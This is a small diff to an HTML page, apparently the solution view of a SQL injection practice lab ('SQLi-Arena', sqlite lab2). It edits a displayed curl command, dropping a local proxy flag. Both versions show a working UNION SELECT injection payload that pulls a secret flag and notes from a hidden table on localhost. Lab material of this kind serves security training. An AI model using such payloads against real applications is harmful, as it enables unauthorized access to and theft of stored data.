@@ -93,7 +93,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab2" \<br> --data-urlencode "name=zzz' UNION SELECT id, secret_flag, notes FROM hidden_data -- -"
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab2" \<br> --data-urlencode "name=zzz' UNION SELECT id, secret_flag, notes FROM hidden_data -- -"
     </div>
 </div>
 
